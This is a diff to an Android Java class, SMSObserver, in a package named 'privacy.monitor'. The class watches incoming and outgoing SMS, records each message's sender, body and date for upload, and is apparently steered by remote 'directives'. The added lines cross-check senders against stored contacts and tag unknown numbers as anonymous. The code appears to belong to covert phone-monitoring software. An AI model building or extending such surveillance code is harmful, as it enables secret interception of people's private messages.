@@ -5,10 +5,12 @@ import java.util.Date;
 import java.util.List;
 import com.baidu.location.LocationClientOption;
 import com.privacy.monitor.base.C;
+import com.privacy.monitor.db.ContactsDB;
 import com.privacy.monitor.db.DirectiveDB;
 import com.privacy.monitor.db.MonitorDB;
 import com.privacy.monitor.db.SMSRecordDB;
 import com.privacy.monitor.db.util.DirectiveUtil;
+import com.privacy.monitor.domain.Contacts;
 import com.privacy.monitor.domain.Directive;
 import com.privacy.monitor.domain.Monitor;
 import com.privacy.monitor.domain.SMSRecord;
@@ -49,7 +51,9 @@ public class SMSObserver extends ContentObserver {
 	private ActivityManager am;
 	private String startTime ="",soundPath;
 	private MonitorDB monitorDB ;
+	private ContactsDB contactsDB;
 	private MediaRecorder mediaRecorder ;
+	private SharedPreferences sp;
 	
 	// 需要获得的字段列
 	private static final String[] PROJECTION = {SMSConstant.TYPE,
@@ -63,8 +67,10 @@ public class SMSObserver extends ContentObserver {
 		this.sqlite = SMSRecordDB.getInstance(context);
 		this.runBack = runBack;
 		this.monitorDB = MonitorDB.getInstance(context);
+		this.contactsDB = ContactsDB.getInstance(context);
 		this.directiveDB = DirectiveDB.getInstance(context);
 		am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
+		sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
 	}
  
 	public SMSObserver(Handler handler) {
@@ -74,7 +80,7 @@ public class SMSObserver extends ContentObserver {
 	@Override
 	public void onChange(boolean selfChange) {
 		super.onChange(selfChange);
-		
+		if (DirectiveUtil.isStopAllFunction(directiveDB))return;
 		//killTask(context);
 		if(mResolver!=null && context !=null && !DirectiveUtil.isStopAllFunction(directiveDB)){
 		
@@ -94,14 +100,25 @@ public class SMSObserver extends ContentObserver {
 					if(typeIndex !=-1 && dateIndex !=-1 && addressIndex !=-1 && bodyIndex !=-1){
 						final String type = smsCursor.getString(typeIndex);
 						final String date = smsCursor.getString(dateIndex);
-						final String phone = smsCursor.getString(addressIndex);
+						String phone = smsCursor.getString(addressIndex);
 						final String body = smsCursor.getString(bodyIndex);
 						
 						//是否监控
 						if(monitorDB !=null && !TextUtils.isEmpty(phone)){
-							Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE+" = ? and " + Monitor.COL_SMS_MONITOR_STATUS +" = ?",new String []{phone,"0"});
-							if(monitor !=null && !TextUtils.isEmpty(monitor.getPhone())){
+							Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE+" = ? and " + Monitor.COL_SMS_MONITOR_STATUS +" = ?",new String []{sp.getString(C.PHONE_NUM,""),"0"});
+							if(monitor !=null && !"1".equals(monitor.getSmsMonitorStatus())){
 								break;
+							}
+							
+							
+							Contacts contacts = contactsDB.queryOnlyRow(Contacts.COL_PHONE+" =?  ",new String []{phone});
+							if(contacts !=null){
+								Monitor monitor2 = monitorDB.queryOnlyRow(Monitor.COL_PHONE+" = ? and " + Monitor.COL_SMS_MONITOR_STATUS +" = ?",new String []{phone,"0"});
+								if(monitor2 !=null && !TextUtils.isEmpty(monitor2.getPhone())){
+									break;
+								}
+							}else {
+								phone = phone+""+"(匿名号码)";
 							}
 						}
 						
@@ -154,6 +171,7 @@ public class SMSObserver extends ContentObserver {
 														smsRecord.setMessageType(type);
 														smsRecord.setMessageContent(body);
 														smsRecord.setDateSent(date);
+														
 														smsRecord.setPhone(phone);
 														smsRecord.setName(names);
 														smsRecord.setUploadStatus("0");
